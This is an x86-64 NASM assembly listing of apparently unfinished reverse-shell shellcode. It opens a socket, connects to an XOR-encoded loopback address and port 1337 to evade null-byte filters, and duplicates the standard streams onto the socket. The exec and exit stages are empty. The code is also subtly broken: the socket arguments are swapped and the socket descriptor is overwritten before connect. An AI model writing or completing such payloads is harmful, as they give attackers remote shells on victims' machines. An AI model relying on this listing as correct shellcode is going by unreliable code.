BITS 64


; socket()
xor		rax,rax		; zero out rax (SYSCALL NMB)
;xor		rdi,rdi		;   "   "  rdi (ARG0)
;xor		rsi,rsi		;   "   "  rsi (ARG1)
;xor		rdx,rdx		;   "   "  rdx (ARG2)
mov		rdx,rax
mov byte	al,41		; socketcall syscall
;mov byte	dil,0x1		; SOCKTYPE
;mov byte	sil,0x2		; SOCKDOMAIN
;mov byte	dl,0x0		; PROTOCOL
mov		rdi,0x1
mov		rsi,0x2
syscall

; connect()
mov		al,42
mov		rdi,rax
xor		rax,rax
push            0x1011116E	; XOR-encoded -> 127.0.0.1
xor dword       [rsp],0x11111111
push word       0x2814          ; push tcp port (XOR-encoded -> 1337)
xor word        [rsp],0x1111 ; decode tcp port
push word       0x2    ; 0x2 -> AF_INET
mov             rsi,rsp
mov		dl,0x10
syscall

; dup2()
mov		al,33
mov		rbx,rdi
xor		rdi,rdi
xor		rsi,rsi
xor             rcx,rcx         ; zero out count register
mov             cl,0x3          ; loopcount
dupes:
xor             eax,eax         ; zero out eax
mov             al,33           ; dup2() syscall
dec             cl
mov		rdi,rcx
mov		rsi,rbx
syscall
inc             cl
loop            dupes

; exec()

; exit()
